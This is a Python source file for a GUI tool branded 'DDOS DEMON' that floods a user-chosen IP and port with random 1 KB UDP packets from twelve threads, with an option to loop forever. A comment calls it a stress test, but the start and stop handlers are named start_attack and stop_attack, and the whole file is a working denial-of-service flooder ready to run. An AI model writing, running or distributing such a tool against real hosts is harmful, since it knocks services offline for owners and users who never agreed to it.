import tkinter as tk
from tkinter import scrolledtext
import socket
import random
import threading
import time

# --- LOGICA DI STRESS TEST (Invariata) ---
def udp_flood_logic(target_ip, target_port, packet_limit, update_log_callback, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Pacchetto esatto da 1 Kbyte (1024 bytes)
    packet_size = 1024 
    bytes_payload = random._urandom(packet_size) 
    
    count = 0
    infinite = (packet_limit == 0)

    try:
        while not stop_event.is_set():
            if not infinite and count >= packet_limit:
                break

            sock.sendto(bytes_payload, (target_ip, target_port))
            count += 1
            
            if count % 250 == 0:
                msg = f"[>] DDos_Demon SENDING 1KB -> {target_ip} | Pkts: {count}\n"
                update_log_callback(msg)
                
        update_log_callback(f"\n[DONE] THREAD FINISHED. {count} Packets (1KB each) Sent.\n")
        
    except Exception as e:
        update_log_callback(f"[ERROR] {e}\n")
    finally:
        sock.close()

# --- INTERFACCIA GRAFICA (GUI Aggiornata) ---
class DemonGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DDOS DEMON - KINETIC TOOL")
        self.root.geometry("800x600") # Altezza ridotta senza il pentacolo
        self.root.configure(bg="black")

        self.stop_event = threading.Event()
        self.threads = []

        # --- BANNER TESTUALE PULITO ---
        self.banner_label = tk.Label(root, text=self.get_clean_banner(), 
                                     font=("Courier New", 12, "bold"), 
                                     bg="black", fg="#ff0000", justify="center")
        self.banner_label.pack(pady=20)

        # --- INPUT FRAME ---
        input_frame = tk.Frame(root, bg="black", highlightbackground="#550000", highlightthickness=2)
        input_frame.pack(pady=10, padx=20, fill="x")

        # 1. INPUT IP TARGET
        tk.Label(input_frame, text="TARGET IP:", font=("Courier", 12, "bold"), bg="black", fg="#ffcc00").grid(row=0, column=0, padx=10, pady=10)
        self.entry_ip = tk.Entry(input_frame, font=("Courier", 12), bg="#110000", fg="#00ff00", insertbackground="red")
        self.entry_ip.insert(0, "192.168.1.105") 
        self.entry_ip.grid(row=0, column=1, padx=10)

        # INPUT PORTA
        tk.Label(input_frame, text="PORT:", font=("Courier", 12, "bold"), bg="black", fg="#ffcc00").grid(row=0, column=2, padx=10)
        self.entry_port = tk.Entry(input_frame, font=("Courier", 12), bg="#110000", fg="#00ff00", width=6, insertbackground="red")
        self.entry_port.insert(0, "80")
        self.entry_port.grid(row=0, column=3, padx=10)

        # 2. INPUT NUMERO PACCHETTI
        tk.Label(input_frame, text="PACKETS (0=Inf):", font=("Courier", 12, "bold"), bg="black", fg="#ffcc00").grid(row=1, column=0, padx=10, pady=10)
        self.entry_packets = tk.Entry(input_frame, font=("Courier", 12), bg="#110000", fg="#00ff00", insertbackground="red")
        self.entry_packets.insert(0, "100000") 
        self.entry_packets.grid(row=1, column=1, padx=10)
        
        tk.Label(input_frame, text="[SIZE LOCKED: 1 KB]", font=("Courier", 10, "italic"), bg="black", fg="#777777").grid(row=1, column=2, columnspan=2)

        # --- BOTTONI ---
        btn_frame = tk.Frame(root, bg="black")
        btn_frame.pack(pady=15)

        self.btn_start = tk.Button(btn_frame, text="▶ EXECUTE", font=("Courier", 14, "bold"), 
                                   bg="#cc0000", fg="white", command=self.start_attack, activebackground="#ff0000", width=15)
        self.btn_start.pack(side="left", padx=20)

        self.btn_stop = tk.Button(btn_frame, text="■ ABORT", font=("Courier", 14, "bold"), 
                                  bg="#444444", fg="white", command=self.stop_attack, state="disabled", width=15)
        self.btn_stop.pack(side="right", padx=20)

        # --- LOG WINDOW ---
        self.log_area = scrolledtext.ScrolledText(root, width=90, height=12, font=("Courier", 10), 
                                                  bg="black", fg="#ff3333")
        self.log_area.pack(pady=10, padx=10)
        self.log_area.insert(tk.END, "[SYSTEM] DDOS DEMON loaded. Payload fixed at 1024 bytes.\n")

    def get_clean_banner(self):
        # ASCII art: Solo il testo grande
        return r"""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    
    D  E  M  O  N
=================================
        """

    def log_message(self, message):
        self.log_area.insert(tk.END, message)
        self.log_area.see(tk.END)

    def start_attack(self):
        ip = self.entry_ip.get()
        try:
            port = int(self.entry_port.get())
            packets = int(self.entry_packets.get())
        except ValueError:
            self.log_message("[ERROR] Input non valido. Inserire numeri interi.\n")
            return

        self.btn_start.config(state="disabled", bg="#330000")
        self.btn_stop.config(state="normal", bg="#00aa00")
        self.log_area.delete(1.0, tk.END)
        
        mode_str = "INFINITE Loop" if packets == 0 else str(packets)
        self.log_area.insert(tk.END, f"[INIT] Targeting {ip}:{port}\n")
        self.log_area.insert(tk.END, f"[INIT] Configuration: {mode_str} Packets @ 1KB each\n")
        self.log_area.insert(tk.END, "[INIT] Starting output...\n")

        self.stop_event.clear()

        thread_count = 12 
        limit_per_thread = int(packets / thread_count) if packets > 0 else 0

        self.threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=udp_flood_logic, args=(ip, port, limit_per_thread, lambda m: self.root.after(0, self.log_message, m), self.stop_event))
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop_attack(self):
        self.log_message("\n[STOP] ABORTED BY USER.\n")
        self.stop_event.set()
        self.btn_start.config(state="normal", bg="#cc0000")
        self.btn_stop.config(state="disabled", bg="#444444")

if __name__ == "__main__":
    root = tk.Tk()
    app = DemonGUI(root)
    root.mainloop()
